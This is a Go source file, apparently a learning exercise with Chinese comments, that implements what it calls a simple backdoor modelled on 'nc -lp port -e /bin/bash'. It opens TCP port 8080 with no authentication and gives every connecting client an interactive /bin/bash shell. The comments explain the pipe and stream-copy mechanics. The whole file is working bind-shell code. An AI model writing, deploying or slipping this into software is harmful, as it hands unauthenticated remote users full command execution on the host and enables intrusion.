package main

import (
	"io"
	"net"
	"os/exec"
)

// 实现一个简单的后门，类似于nc的后门 nc -lp port -e /bin/bash
// 实现原理 listener.Accept() 返回一个net.Conn ，这个net.Conn即时Writer又是Reader，
// 实现思路  我们建立一个tcp连接，tcp连接的输入即为cmd的输入，cmd的输出即为tcp的输出  client -> command -> wp -> out -> rp -> client

// 基础知识： 1. io.Pipe(),用于缓存command的输出  2. io.Copy() 用于将command输出重定向到connect的输出 3. net.Linsten() 建立连接   4. exec.Command()准备执行一个命令，命令执行三种模式 -i交互式  -c 参数执行，可以添加执行上下文等，进行精细化操作  cmd.Run() 执行一个命令

func main() {
	var (
		listener net.Listener
		err      error
		conn     net.Conn
	)
	listener, err = net.Listen("tcp", ":8080")
	if err != nil {
		panic(err)
	}

	for {
		conn, err = listener.Accept()
		if err != nil {
			panic(err)
		}

		go handler(conn)

	}
}

// 函数处理
func handler(conn net.Conn) {
	var (
		cmd *exec.Cmd
		wp  *io.PipeWriter
		rp  *io.PipeReader
	)
	defer conn.Close()
	cmd = exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	rp, wp = io.Pipe() // 建立一个管道，所有的wp都会被rp读到， 用于承接cmd.stdout和conn out
	cmd.Stdout = wp
	go io.Copy(conn, rp) // 命令的输出，重定向到tcp输出  
	cmd.Run()   // 为什么不能先Run 再copy？
}
